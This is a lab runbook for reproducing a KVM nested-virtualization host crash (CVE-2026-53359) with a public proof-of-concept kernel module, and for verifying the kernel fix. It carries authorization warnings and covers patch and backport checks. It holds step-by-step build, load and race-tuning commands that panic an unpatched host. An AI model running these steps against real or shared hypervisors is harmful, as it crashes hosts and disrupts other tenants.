---
title: "Reproducing Januscape in a Lab (CVE-2026-53359)"
description: "A lab runbook for standing up a nested KVM environment, building the public PoC, triggering the host panic, and verifying the fix."
date: 2026-10-01
category: offensive
readTime: "12 min read"
mitre:
  - "T1611"
tags:
  - "KVM"
  - "Virtualization Escape"
  - "Lab Setup"
  - "CVE-2026-53359"
  - "Linux Kernel"
  - "Nested Virtualization"
  - "Vulnerability Research"
  - "Homelab"
summary: "A lab runbook for standing up a nested KVM environment, building the public PoC, triggering the host panic, and verifying the fix."
---

<div align="center">

**Authorized-testing runbook.** The PoC panics the host kernel.

Only on hardware you own or have explicit written permission to test. A lab L0
you can afford to lose is a hard requirement, not a nicety.

Companion to the [root-cause analysis](/writeups/januscape-kvm-escape-01/).

</div>

---

## Before anything: can this machine run it?

I checked my own box first, which turned out to be four separate blockers at once:

```
$ uname -r
7.2.3-arch1-3
$ nproc
2
$ ls -l /dev/kvm
no /dev/kvm
$ grep -oE 'vmx|svm' /proc/cpuinfo | sort -u
(nothing)
```

| Blocker | Detail | Consequence |
|---|---|---|
| **Kernel already patched** | 7.2.3 > 7.2-rc1, first release carrying `81ccda30b4e8` | Nothing to reproduce |
| **No KVM, no `/dev/kvm`** | No `kvm` modules, no device node | Can't run a nested L1 at all |
| **No VMX/SVM in CPUID** | Virtualization extensions not exposed | PoC's `virt_supported()` aborts with `-ENODEV` |
| **2 cores** | PoC defaults to `nvcpu=8`; the race needs faulters contending on `mmu_lock` | Window far too narrow |

So reproduction needs a **separate, disposable, unpatched** x86_64 host. Check
your own environment against that list before planning a lab — the answer is
frequently "not this machine."

> **On cloud instances.** The panic lands on the *hypervisor*, not your VM. An
> instance with nested virt exposed is a live multi-tenant host. Getting a panic
> on a provider's box isn't authorized testing, no matter how isolated your VM
> feels. Reproduce on your own metal, or under a program with explicit scope for
> host-level testing.

### Where to run it

| Option | Suitability |
|---|---|
| Bare-metal x86_64 you own, kernel 6.1–7.1 unpatched | **Best** |
| Nested lab (L0' → L1' → L1 → L2) | Workable; needs `nested=1` at two levels, unpatched at both |
| Cloud with nested virt | Only if the *host* kernel is unpatched — and only with permission |
| PVE 8/9 with a pre-fix kernel snapshot | Good; snapshot the VM so you can roll back |
| Any ARM64 host | **Impossible** — different MMU, that's ITScape (CVE-2026-46316) |

---

## Topology

Three levels, and all three matter:

```
L0  bare-metal x86_64 Linux, kvm_intel/kvm_amd with nested=1   <-- PANICS HERE
     |
     +-- L1  your attacker guest (poc.ko is loaded HERE)
           needs >= 8 vCPUs, >= 2 GB RAM
           |
           +-- L2  nested guest created by poc.ko with raw VMX/SVM
```

L0 must shadow L1's nested EPT/NPT through the **shadow MMU** — the only path to
`kvm_mmu_get_child_sp()`. A default `ept=1` / `tdp_mmu=Y` host still reaches it,
but only once L1 actually runs L2 with nested paging.

### Preconditions

- [ ] L0 is x86_64 and **unpatched** (2.6.36–7.1, or any tree without `81ccda30b4e8`)
- [ ] L0 has nested virt enabled, and it stays enabled
- [ ] L0 console access — physical, IPMI, or serial. **The panic kills SSH.**
- [ ] L1 has **≥ 8 vCPUs** (`nvcpu` default) and ≥ 2 GB RAM
- [ ] L1 kernel headers match `uname -r` exactly
- [ ] L1 can `rmmod` its own `kvm_intel` / `kvm_amd`
- [ ] You can rebuild or reinstall L0 afterward

---

## Step 0 — confirm L0 is vulnerable and nested is on

On **L0**:

```bash
# Is the fix present? (want: NO output)
sudo grep -rn "role.word == role.word" /lib/modules/$(uname -r)/build/arch/x86/kvm/mmu/mmu.c

# Version vs. the fixed window (>= 7.2 carries the fix)
uname -r

# Nested virt must be on
cat /sys/module/kvm_intel/parameters/nested    # Intel: expect Y
cat /sys/module/kvm_amd/parameters/nested      # AMD:   expect Y

# x86 only
uname -m

# Who can open the device (the local LPE vector, independent of the escape)
ls -l /dev/kvm
```

If nested reads `N`:

```bash
echo 'options kvm_intel nested=1' | sudo tee /etc/modprobe.d/99-nested.conf
sudo modprobe -r kvm_intel
sudo modprobe kvm_intel
cat /sys/module/kvm_intel/parameters/nested
```

If your distro pinned a kernel that already carries the fix, drop to a pre-7.2
kernel or find different hardware. There's no in-place way to reintroduce the bug.

**Optional baseline:** before risking anything, confirm nested virt works at all
by running a *normal* nested guest in L1. If that's broken, you'll be debugging
your lab instead of the bug.

---

## Step 1 — build L1

### Create the disk

```bash
qemu-img create -f qcow2 l1.qcow2 16G
```

Install a minimal Linux — Debian/Ubuntu/Alma netinst is fine. You need a compiler
and headers, not much else.

### Launch with nested virt and ≥ 8 vCPUs

Intel host:

```bash
qemu-system-x86_64 \
  -enable-kvm \
  -cpu host,vmx=on \
  -m 4096 \
  -smp 8 \
  -drive file=l1.qcow2,if=virtio,format=qcow2 \
  -netdev user,id=n0 \
  -device virtio-net-pci,netdev=n0 \
  -nographic
```

AMD host — swap the CPU feature:

```bash
  -cpu host,svm=on \
```

libvirt equivalent inside `<domain>`:

```xml
<cpu mode='host-passthrough' check='none'/>
<features>
  <kvm>
    <hidden state='on'/>
  </kvm>
</features>
```

with `<vcpu placement='static'>8</vcpu>` and ≥ 4 GB RAM.

> `host-passthrough` / `-cpu host` is the load-bearing part. It hands L1 the CPU's
> real VMX/SVM feature bits, which is what L1's module needs to execute
> `vmxon`/`vmlaunch` for its own L2. A generic `-cpu qemu64` model makes
> `virt_supported()` abort.

### Verify L1 can see VMX/SVM

```bash
# In L1
grep -m1 flags /proc/cpuinfo | tr ' ' '\n' | grep -xE 'vmx|svm'
nproc        # want >= 8
free -g      # want >= 2 available
```

Non-empty output means the nested path is exposed. Empty means fix the launch
flags before going further.

---

## Step 2 — build the PoC

```bash
# In L1, as root
apt-get update
apt-get install -y build-essential git linux-headers-$(uname -r)

cd /root
git clone https://github.com/V4bel/Januscape.git
cd Januscape
make
```

Repo layout:

```
Januscape/
├── Makefile          # obj-m += poc.o ; KDIR ?= /lib/modules/$(uname -r)/build
├── poc.c             # the whole PoC
├── README.md         # abstract, usage, FAQ
└── assets/
    ├── write-up.md   # the root-cause analysis
    ├── demo.gif
    └── tux.png
```

Build issues:

- `fatal error: linux/module.h` → headers missing or mismatched. Confirm
  `linux-headers-$(uname -r)` matches `uname -r` exactly.
- `SVM_NESTED_CTL_NP_ENABLE` errors on a 7.1+ kernel → the PoC already shims this
  (`vmcb.nested_ctl` → `vmcb.misc_ctl` in `1aea80dd42cf`). Hitting it means an
  unexpected tree.

### Expected log on a healthy load

```
poc: backend=VMX/EPT (amd=0) nvcpu=8 online=8 run_ms=600000  [rmmod kvm_intel first!]
[*] poc step 1/4: backend=VMX/EPT ready (rmmod kvm_intel done)
poc: DIAG VMX BASIC=... EPT_VPID=...
poc: world built root=... greg=... q=... (S.gfn=... prime_gfn=... q_gfn=...)
[*] poc step 2/4: nested page tables + L3 guest image built
[*] poc step 3/4: launching 8 kthreads (1 writer + 7 faulters)
poc[VMX/EPT]: 8 kthreads launched (1 writer + 0 flood + 7 faulters); race live
[*] poc step 4/4: race live -- host DoS triggering
poc[VMX/EPT]: writer live cpu0 dwell=256 run_ms=600000
```

Failure signatures are diagnostic:

- `poc: CPU lacks VMX -> abort` → L1 wasn't given VMX. Back to Step 1.
- `poc: run_guest RETURNED early cpuN vmerr=... exit=...` → VMX launch failed.
  Usually a CR4.VMX or feature-control problem in the L1 launch flags.

Keep the `world built root=... S.gfn=... prime_gfn=... q_gfn=...` line. It's your
proof the intended geometry was actually built — without it a null result means
nothing.

---

## Step 3 — run it

```bash
# In L1, as root
rmmod kvm_intel
insmod poc.ko                 # Intel
# insmod poc.ko amd=1         # AMD

# watch from a second L1 terminal
dmesg -w
```

**The `rmmod` is mandatory.** The PoC takes raw VMX/SVM state directly. If
`kvm_intel` / `kvm_amd` still owns the CPU, `vmxon` fails or the launch collides.
If `rmmod` refuses with "Module kvm_intel is in use", stop any KVM-accelerated
guest running inside L1 first.

### Watching the race

Genuinely racy — expect **seconds to minutes**. Healthy traffic in L1's `dmesg`:

```
poc: writes=2000000 race=... svm_exits=...
poc: writes=4000000 race=... svm_exits=...
```

`race_loops` climbing means the faulters are cycling. The writer self-stops after
`run_ms` (default 600000 = 10 min):

```
poc[VMX/EPT]: writer deadline (writes=... race=... svm_exits=...) -> stop
poc: unloaded
```

**If that deadline hits with no panic, L0 is probably patched.** That's a valid but
*partial* result — absence of a crash is weak evidence, since the race may simply
have lost. Re-run, then confirm by source inspection.

### The crash, on L0's console

```
gfn mismatch under direct page 8a00 (expected 8b00, got 256e4)
WARNING: CPU: 6 PID: 974281 at arch/x86/kvm/mmu/mmu.c:689 kvm_mmu_page_set_translation.part.0+0xb7/0x130 [kvm]
CPU: 6 PID: 974281 Comm: qemu-kvm  6.12.0-211.26.1.el10_2.x86_64
kernel BUG at arch/x86/kvm/mmu/mmu.c:1091!
RIP: 0010:pte_list_remove.isra.0+0xd9/0xe0 [kvm]
CPU: 3 PID: 974278 Comm: qemu-kvm
```

| Line | Meaning |
|---|---|
| `gfn mismatch under direct page` | The symptom WARN — a direct split page received a leaf whose GFN ≠ `sp->gfn + index` |
| `WARNING ... kvm_mmu_page_set_translation` | Role confusion already happened; rmap registered under the real GFN |
| `kernel BUG at mmu.c:1091` | The fatal one — `pte_list_remove` found no rmap entry under the computed key |
| `Comm: qemu-kvm` | The host-side KVM thread that was walking the L2 tables |

L1's console dies at the same moment (that vCPU thread is `qemu-kvm` on L0). L0
may survive in some configs — treat it as compromised and rebuild regardless.

---

## Step 4 — parameters and tuning

```
$ insmod poc.ko help
amd:       int  0444  0        1 = AMD SVM/NPT, 0 = Intel VMX/EPT (default 0)
nvcpu:     int  0444  8        kthreads launched: 1 writer + (nvcpu-1) faulters
dwell:     int  0444  256      cpu_relax() spins per toggle state — the race window
run_ms:    int  0444  600000   writer deadline before self-stop (ms)
diag:      int  0444  1        1 = basic prints, 2 = verbose per-exit diagnostics
nflood:    int  0444  0        extra Intel-only EPT-root flood threads
```

### Not winning the race

The window is the non-atomic gap between L0 committing the guest's PDE write and
zapping the old shadow link in `kvm_page_track_write`. More faulters contending on
`mmu_lock` widens it:

```bash
# more faulters
insmod poc.ko nvcpu=16

# wider window per toggle state
insmod poc.ko nvcpu=16 dwell=1024

# more time
insmod poc.ko nvcpu=16 dwell=1024 run_ms=1800000
```

Diminishing returns — too large a `dwell` and the writer never completes a cycle.
Sweep it:

```bash
for d in 64 128 256 512 1024; do
    echo "=== dwell=$d ==="
    insmod poc.ko nvcpu=16 dwell=$d run_ms=600000
    sleep 5
done
```

**More physical cores on L0 is a bigger lever than any parameter.** The race is
about parallelism. An under-provisioned shared 2-4 vCPU cloud instance is the most
common reason the PoC "does nothing."

### AMD specifics

`nflood` is forced to 0 on AMD — the flood threads are Intel-only:

```c
role_of[cpu] = (cpu == 0)           ? R_WRITER :
               (cpu <= nflood && !amd) ? R_FLOOD : R_FAULT;
```

Passing `nflood` on AMD gives you plain faulters, not a crash. Not a setup bug. The
researcher notes the AMD-specific *full escape* is empirically a little easier,
though the DoS is identical on both.

### Verbose diagnostics

```bash
insmod poc.ko diag=2
```

On AMD this prints the first VM-exit plus a running histogram, and watches for the
probe page's canary:

```
poc[SVM]: first vmexit cpu0 exit_code=0x... info1=... info2=... rip=... rax=... (NPF=0x400 VMMCALL=0x81 HLT=0x78 ERR=0xffffffff)
poc[SVM] hist cpu0: vmmcall=... npf=... hlt=... ERR=... other=... saw_4141=... nest_pd[4]=...
poc[SVM]: cpu0 rip=... rax=0x4141..
```

`rax=0x4141...` is the strongest **positive** signal short of the panic: L2
actually executed the load against the `q` probe page (filled with `0x41`) that
`ptg[PRIME_IDX]` points at. Never seeing it means the nested guest isn't running L2
code as expected.

Exit-code legend the PoC itself uses: `0x81` VMMCALL, `0x400` NPF, `0x78` HLT,
`0xffffffff` error.

---

## Step 5 — confirming the fix

### Source check (authoritative)

```bash
# On L0
sudo grep -n -A14 "kvm_mmu_get_child_sp(struct kvm_vcpu" \
  /lib/modules/$(uname -r)/build/arch/x86/kvm/mmu/mmu.c | head -30
```

Vulnerable:

```c
	if (is_shadow_present_pte(*sptep) && !is_large_pte(*sptep) &&
	    spte_to_child_sp(*sptep) && spte_to_child_sp(*sptep)->gfn == gfn)
		return ERR_PTR(-EEXIST);

	role = kvm_mmu_child_role(sptep, direct, access);
```

Fixed — note `role.word == role.word` and the hoisted `role` init:

```c
	union kvm_mmu_page_role role = kvm_mmu_child_role(sptep, direct, access);

	if (is_shadow_present_pte(*sptep) &&
	    !is_large_pte(*sptep) &&
	    spte_to_child_sp(*sptep) &&
	    spte_to_child_sp(*sptep)->gfn == gfn &&
	    spte_to_child_sp(*sptep)->role.word == role.word)
		return ERR_PTR(-EEXIST);
```

One-liner verdict:

```bash
sudo grep -q "role.word == role.word" \
  /lib/modules/$(uname -r)/build/arch/x86/kvm/mmu/mmu.c \
  && echo "PATCHED" || echo "VULNERABLE (or headers unavailable)"
```

### Backport check

```bash
cd /usr/src/linux   # or your stable clone
git log --oneline --all --grep="unexpected role" | head
git branch -a --contains 81ccda30b4e8 2>/dev/null
```

### Version heuristic

`>= 7.2` carries the fix in-tree. Everything from 2.6.36 to 7.1 is in-window
unless a backport landed. 7.0.y, 5.15.y and 5.10.y will never get it — 7.0.y is
EOL, and the pre-6.0 trees don't contain the patched function at all.

RHEL-family kernels backport without moving the base version, so the version
string lies. Check the erratum: RHSA-2026:36956 (EL10), :36957 (EL9), :39083 (EL8).

### The patched-behaviour test

Load the PoC against a patched L0. Expected: the race runs to its `run_ms` deadline
and logs `writer deadline ... -> stop` with **no** panic. The role comparison makes
`kvm_mmu_get_child_sp` fall through to `kvm_mmu_get_shadow_page(vcpu, gfn, role)`,
rmap keys never diverge, and `pte_list_remove` finds its entry.

Weak evidence only — it could also be a lost race. Confirm by source.

---

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `poc: CPU lacks VMX -> abort` | L1 launched without VMX/SVM | `-cpu host,vmx=on`; libvirt `host-passthrough` + `<kvm><hidden state='on'/></kvm>` |
| `rmmod kvm_intel: Module is in use` | A KVM guest is running inside L1 | `virsh destroy` / kill the nested qemu |
| `vmxon fail cpu0` | CR4.VMX unusable, or `kvm_intel` still loaded | Confirm `rmmod` succeeded; re-check nested=1 on L0 |
| `vmclear/ptrld fail cpu0` | VMCS region not 4K-aligned or bad revision | Ensure enough guest RAM; check for a corrupted build |
| `NO EPT ctl cpu0` | EPT not exposed to L1 | Confirm `kvm-intel.ept=1`; add explicit `vmx=on` |
| `run_guest RETURNED early vmerr=...` | Launch failed; `vmerr` = VM-instruction error, `exit` = exit reason | Decode both; usually feature-control or CR0/CR4 masking |
| Race never wins, deadline hit | Too few cores, or `nvcpu` < online CPUs | More L0 cores; `nvcpu=16`, `dwell=512` |
| `saw_4141` never set (diag=2) | L2 isn't executing the load | Check `nest_pd[4]` in the histogram; verify the L2 image built |
| Crash on L1 instead of L0 | Out of nested levels | L0 itself must be virtualized, with nested enabled at both levels |
| Immediate crash at insmod | Something else is broken on L0 | Not this bug — check L0's `dmesg` before/after |
| `nflood` seems ignored | AMD path forces it to 0 | Expected; flood is Intel-only |
| Module won't load at all | Headers/build mismatch | `uname -r` vs `linux-headers-$(uname -r)`; `dmesg \| tail` |

---

## Capturing results

```bash
# On L0, before running
sudo dmesg -w > /tmp/l0-dmesg.txt 2>&1 &
echo $! > /tmp/dmesg.pid

# ... run the PoC in L1 ...

# after the panic
kill "$(cat /tmp/dmesg.pid)" 2>/dev/null
grep -E "gfn mismatch|kernel BUG|pte_list_remove|kvm_mmu_page_set_translation" \
    /tmp/l0-dmesg.txt | tee panic-$(date +%F).txt
```

Capture L1's `dmesg` too. The `world built root=... S.gfn=... prime_gfn=...
q_gfn=...` line proves the intended geometry was built, and without it a null
result is uninterpretable.

If you publish results, pin the commit SHA you tested against and record the
embargo lift date (2026-07-06), so readers can tell exactly which PoC revision your
results correspond to.

---

## Cleanup

```bash
# In L1
rmmod poc
modprobe kvm_intel        # reload if you need KVM back
lsmod | grep -E '^kvm_(intel|amd)'
```

**On L0, after a successful repro: rotate anything that lived on that host.** You
crashed it; you don't know what else touched it. Check that the L0 kernel carries
`81ccda30b4e8` before returning it to service — or better, rebuild.

---

## References

| What | Where |
|---|---|
| Root-cause analysis (companion) | https://github.com/V4bel/Januscape |
| oss-security post | https://www.openwall.com/lists/oss-security/2026/07/06/7 |
| Fix commit | https://github.com/torvalds/linux/commit/81ccda30b4e83d8f5cc4fd50503c44e3a33abfeb |
| Patch-status tracker | https://github.com/suominen/januscape |
| Canonical mitigations | https://canonical.com/blog/januscape-linux-vulnerability-mitigations-available |
| Debian security tracker | https://security-tracker.debian.org/tracker/CVE-2026-53359 |
